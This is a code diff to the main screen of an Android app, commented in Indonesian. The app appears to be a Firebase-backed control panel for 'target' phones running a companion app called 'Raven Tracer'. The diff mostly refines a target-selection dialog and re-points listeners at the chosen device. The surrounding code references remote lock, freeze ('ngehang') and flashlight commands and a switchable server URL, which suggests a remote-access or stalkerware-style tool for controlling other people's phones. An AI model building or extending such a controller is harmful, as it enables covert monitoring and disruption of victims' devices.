@@ -7,6 +7,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.text.InputType;
+import android.view.Gravity;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -120,12 +121,16 @@ public class MainActivity extends AppCompatActivity {
         swNgehang = cardNgehang.findViewById(R.id.swFitur);
         tvNgehangStatus = cardNgehang.findViewById(R.id.tvStatusFitur);
 
-        sendMyDeviceInfo();
+        // ===== LISTEN DATA TARGET =====
         listenDeviceInfoRealtime();
+
+        // ===== LISTEN STATUS =====
         listenStatusRealtime();
+
+        // ===== LISTEN TARGET LIST =====
         listenTargetList();
 
-        // ===== GANTI SERVER (DIALOG INPUT) =====
+        // ===== GANTI SERVER =====
         btnSetServer.setOnClickListener(v -> {
             showInputDialog("🌐 Ganti Server", "Masukkan URL server baru:", "SIMPAN", (input) -> {
                 if (!input.isEmpty()) {
@@ -494,10 +499,17 @@ public class MainActivity extends AppCompatActivity {
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setPadding(20, 20, 20, 20);
 
+        // Loading state
+        TextView loading = new TextView(this);
+        loading.setText("⏳ Memuat daftar target...");
+        loading.setTextColor(0xFFFFFFFF);
+        loading.setPadding(16, 16, 16, 16);
+        loading.setGravity(Gravity.CENTER);
+        layout.addView(loading);
+
         builder.setView(layout);
         AlertDialog dialog = builder.create();
 
-        // Ambil daftar target dari Firebase
         mDatabase.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -507,7 +519,7 @@ public class MainActivity extends AppCompatActivity {
 
                 for (DataSnapshot child : snapshot.getChildren()) {
                     String key = child.getKey();
-                    if (key == null || key.equals("deviceInfo") || key.equals("serverUrl")) continue;
+                    if (key == null || key.equals("serverUrl")) continue;
 
                     String deviceName = child.child("deviceName").getValue(String.class);
                     String deviceId = child.child("deviceId").getValue(String.class);
@@ -518,31 +530,38 @@ public class MainActivity extends AppCompatActivity {
                     hasTarget = true;
                     if (online != null && online) hasOnlineTarget = true;
 
+                    // ===== ITEM TARGET =====
                     LinearLayout item = new LinearLayout(MainActivity.this);
                     item.setOrientation(LinearLayout.VERTICAL);
-                    item.setPadding(16, 12, 16, 12);
+                    item.setPadding(16, 14, 16, 14);
                     item.setBackgroundColor(0x1A1A1A);
                     item.setClickable(true);
+                    item.setFocusable(true);
 
+                    // Nama + Status + Baterai
                     TextView tvName = new TextView(MainActivity.this);
-                    String status = online != null && online ? "🟢 ONLINE" : "🔴 OFFLINE";
-                    String bat = battery != null ? battery + "%" : "?%";
-                    tvName.setText(deviceName + " (" + status + ") " + bat);
-                    tvName.setTextColor(online != null && online ? 0xFF4ADE80 : 0xFFFF5C7C);
+                    String statusText = (online != null && online) ? "🟢 ONLINE" : "🔴 OFFLINE";
+                    String batText = (battery != null) ? battery + "%" : "?%";
+                    tvName.setText(deviceName + " (" + statusText + ") " + batText);
+                    tvName.setTextColor((online != null && online) ? 0xFF4ADE80 : 0xFFFF5C7C);
+                    tvName.setTextSize(16);
+                    tvName.setTypeface(null, android.graphics.Typeface.BOLD);
                     item.addView(tvName);
 
+                    // ID
                     TextView tvId = new TextView(MainActivity.this);
                     tvId.setText("ID: " + deviceId);
                     tvId.setTextColor(0xFF9CA3AF);
                     tvId.setTextSize(12);
                     item.addView(tvId);
 
-                    // Kalo offline, gak bisa diklik
                     if (online == null || !online) {
-                        item.setAlpha(0.5f);
+                        item.setAlpha(0.6f);
                         item.setClickable(false);
+                        item.setFocusable(false);
+
                         TextView offlineMsg = new TextView(MainActivity.this);
-                        offlineMsg.setText("⚠️ Target offline");
+                        offlineMsg.setText("⚠️ Target offline / belum login");
                         offlineMsg.setTextColor(0xFFFF5C7C);
                         offlineMsg.setTextSize(11);
                         offlineMsg.setPadding(0, 4, 0, 0);
@@ -551,6 +570,7 @@ public class MainActivity extends AppCompatActivity {
                         item.setOnClickListener(v -> {
                             selectedTargetId = key;
                             isTargetConnected = true;
+
                             if (deviceName != null) {
                                 tvDeviceName.setText(deviceName);
                                 tvDeviceName2.setText(deviceName);
@@ -564,34 +584,41 @@ public class MainActivity extends AppCompatActivity {
                                 tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                                 tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                             }
-                            Toast.makeText(MainActivity.this, "✅ Target dipilih: " + deviceName, Toast.LENGTH_SHORT).show();
-                            dialog.dismiss();
+
+                            new AlertDialog.Builder(MainActivity.this)
+                                    .setTitle("✅ Target Dipilih")
+                                    .setMessage("Target: " + deviceName + "\nStatus: " + (online ? "ONLINE" : "OFFLINE"))
+                                    .setPositiveButton("OK", (d, w) -> dialog.dismiss())
+                                    .show();
                         });
                     }
 
                     layout.addView(item);
+
+                    // Spacer
                     View spacer = new View(MainActivity.this);
-                    spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 8));
+                    spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 10));
                     layout.addView(spacer);
                 }
 
+                // ===== BELUM ADA TARGET =====
                 if (!hasTarget) {
-                    // BELUM ADA TARGET SAMA SEKALI
                     LinearLayout emptyLayout = new LinearLayout(MainActivity.this);
                     emptyLayout.setOrientation(LinearLayout.VERTICAL);
                     emptyLayout.setPadding(20, 30, 20, 30);
+                    emptyLayout.setGravity(Gravity.CENTER);
 
                     TextView icon = new TextView(MainActivity.this);
                     icon.setText("📡");
-                    icon.setTextSize(48);
-                    icon.setGravity(android.view.Gravity.CENTER);
+                    icon.setTextSize(56);
+                    icon.setGravity(Gravity.CENTER);
                     emptyLayout.addView(icon);
 
                     TextView noTarget = new TextView(MainActivity.this);
                     noTarget.setText("⚠️ Belum ada target yang terhubung");
                     noTarget.setTextColor(0xFFFF5C7C);
-                    noTarget.setTextSize(16);
-                    noTarget.setGravity(android.view.Gravity.CENTER);
+                    noTarget.setTextSize(17);
+                    noTarget.setGravity(Gravity.CENTER);
                     noTarget.setPadding(0, 16, 0, 16);
                     emptyLayout.addView(noTarget);
 
@@ -599,27 +626,29 @@ public class MainActivity extends AppCompatActivity {
                     sub.setText("Install Raven Tracer di HP target dan login");
                     sub.setTextColor(0xFF9CA3AF);
                     sub.setTextSize(13);
-                    sub.setGravity(android.view.Gravity.CENTER);
+                    sub.setGravity(Gravity.CENTER);
                     emptyLayout.addView(sub);
 
                     layout.addView(emptyLayout);
-                } else if (!hasOnlineTarget) {
-                    // ADA TARGET TAPI SEMUA OFFLINE
+                }
+                // ===== SEMUA TARGET OFFLINE =====
+                else if (!hasOnlineTarget) {
                     LinearLayout offlineLayout = new LinearLayout(MainActivity.this);
                     offlineLayout.setOrientation(LinearLayout.VERTICAL);
                     offlineLayout.setPadding(20, 30, 20, 30);
+                    offlineLayout.setGravity(Gravity.CENTER);
 
                     TextView icon = new TextView(MainActivity.this);
                     icon.setText("📡");
-                    icon.setTextSize(48);
-                    icon.setGravity(android.view.Gravity.CENTER);
+                    icon.setTextSize(56);
+                    icon.setGravity(Gravity.CENTER);
                     offlineLayout.addView(icon);
 
                     TextView noOnline = new TextView(MainActivity.this);
                     noOnline.setText("⚠️ Semua target offline");
                     noOnline.setTextColor(0xFFFF5C7C);
-                    noOnline.setTextSize(16);
-                    noOnline.setGravity(android.view.Gravity.CENTER);
+                    noOnline.setTextSize(17);
+                    noOnline.setGravity(Gravity.CENTER);
                     noOnline.setPadding(0, 16, 0, 16);
                     offlineLayout.addView(noOnline);
 
@@ -627,7 +656,7 @@ public class MainActivity extends AppCompatActivity {
                     sub.setText("Tunggu target online kembali");
                     sub.setTextColor(0xFF9CA3AF);
                     sub.setTextSize(13);
-                    sub.setGravity(android.view.Gravity.CENTER);
+                    sub.setGravity(Gravity.CENTER);
                     offlineLayout.addView(sub);
 
                     layout.addView(offlineLayout);
@@ -636,10 +665,12 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onCancelled(@NonNull DatabaseError error) {
+                layout.removeAllViews();
                 TextView err = new TextView(MainActivity.this);
                 err.setText("❌ Gagal memuat daftar target");
                 err.setTextColor(0xFFFF5C7C);
                 err.setPadding(16, 16, 16, 16);
+                err.setGravity(Gravity.CENTER);
                 layout.addView(err);
             }
         });
@@ -728,7 +759,6 @@ public class MainActivity extends AppCompatActivity {
                             isTargetConnected = online != null && online;
                         });
                     } else {
-                        // Target yang dipilih udah gak ada
                         runOnUiThread(() -> {
                             selectedTargetId = null;
                             isTargetConnected = false;
@@ -753,32 +783,38 @@ public class MainActivity extends AppCompatActivity {
         deviceListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
-                if (snapshot.exists()) {
-                    String deviceName = snapshot.child("deviceName").getValue(String.class);
-                    String deviceId = snapshot.child("deviceId").getValue(String.class);
-                    Integer battery = snapshot.child("battery").getValue(Integer.class);
-                    Boolean online = snapshot.child("online").getValue(Boolean.class);
-                    runOnUiThread(() -> {
-                        if (deviceName != null) {
-                            tvDeviceName.setText(deviceName);
-                            tvDeviceName2.setText(deviceName);
-                        }
-                        if (deviceId != null) {
-                            tvDeviceId.setText(deviceId);
-                            tvDeviceId2.setText(deviceId);
-                        }
-                        if (battery != null) tvBattery.setText(battery + "%");
-                        if (online != null) {
-                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
-                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
-                        }
-                    });
+                if (selectedTargetId != null) {
+                    DataSnapshot targetSnapshot = snapshot.child(selectedTargetId);
+                    if (targetSnapshot.exists()) {
+                        String deviceName = targetSnapshot.child("deviceName").getValue(String.class);
+                        String deviceId = targetSnapshot.child("deviceId").getValue(String.class);
+                        Integer battery = targetSnapshot.child("battery").getValue(Integer.class);
+                        Boolean online = targetSnapshot.child("online").getValue(Boolean.class);
+
+                        runOnUiThread(() -> {
+                            if (deviceName != null) {
+                                tvDeviceName.setText(deviceName);
+                                tvDeviceName2.setText(deviceName);
+                            }
+                            if (deviceId != null) {
+                                tvDeviceId.setText(deviceId);
+                                tvDeviceId2.setText(deviceId);
+                            }
+                            if (battery != null) tvBattery.setText(battery + "%");
+                            if (online != null) {
+                                tvStatus.setText(online ? "ONLINE" : "OFFLINE");
+                                tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
+                            }
+                            isTargetConnected = online != null && online;
+                        });
+                    }
                 }
             }
+
             @Override
             public void onCancelled(@NonNull DatabaseError error) {}
         };
-        mDatabase.child("deviceInfo").addValueEventListener(deviceListener);
+        mDatabase.child(selectedTargetId != null ? selectedTargetId : "deviceInfo").addValueEventListener(deviceListener);
     }
 
     // ===== REAL-TIME: STATUS =====
@@ -924,7 +960,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if (deviceListener != null) mDatabase.child("deviceInfo").removeEventListener(deviceListener);
+        if (deviceListener != null) mDatabase.child(selectedTargetId != null ? selectedTargetId : "deviceInfo").removeEventListener(deviceListener);
         if (flashlightListener != null) mDatabase.child("flashlight").removeEventListener(flashlightListener);
         if (lockLowListener != null) mDatabase.child("lockLow").removeEventListener(lockLowListener);
         if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
@@ -937,4 +973,4 @@ public class MainActivity extends AppCompatActivity {
     interface OnInputListener {
         void onInput(String input);
     }
-                    }
+    }
